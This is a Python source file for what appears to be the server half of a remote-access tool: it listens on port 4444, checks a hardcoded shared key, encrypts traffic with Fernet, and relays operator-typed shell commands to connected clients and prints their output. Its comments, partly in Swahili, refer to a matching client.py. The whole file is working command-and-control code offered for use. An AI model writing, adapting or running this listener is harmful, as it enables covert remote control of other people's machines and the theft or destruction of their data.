import socket
import threading
import base64
import os
from cryptography.fernet import Fernet

# Set your authentication key (must match on client)
AUTH_KEY = b"SuperSecretKey123!"  # Change this and keep it secret secure, hakikisha unachange pia on client side script

# Generate encryption key from AUTH_KEY
def generate_key(auth_key):
    return base64.urlsafe_b64encode(auth_key.ljust(32)[:32])

ENCRYPTION_KEY = generate_key(AUTH_KEY)
cipher = Fernet(ENCRYPTION_KEY)

HOST = '0.0.0.0'  
PORT = 4444       # change kama unataka lakn hakikisha unaenda change pia kwenye client.py

clients = []

def encrypt_message(message):
    return cipher.encrypt(message.encode())

def decrypt_message(message):
    return cipher.decrypt(message).decode()

def handle_client(client_socket, addr):
    try:
        # Authenticate client
        auth_data = client_socket.recv(1024)
        if decrypt_message(auth_data) != AUTH_KEY.decode():
            print(f"[!] Unauthorized client from {addr}")
            client_socket.send(encrypt_message("Authentication Failed"))
            client_socket.close()
            return
        
        print(f"[+] Client {addr} authenticated successfully!")
        client_socket.send(encrypt_message("Authentication Successful"))

        while True:
            command = input("Enter command to send: ")
            if command.lower() == "exit":
                break

            client_socket.send(encrypt_message(command))
            response = client_socket.recv(4096)
            print(f"[Response]:\n{decrypt_message(response)}")

    except Exception as e:
        print(f"[!] Error: {e}")

    client_socket.close()
    clients.remove(client_socket)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Server listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        clients.append(client_socket)
        print(f"[+] Connection received from {addr}")
        threading.Thread(target=handle_client, args=(client_socket, addr)).start()

if __name__ == "__main__":
    start_server()
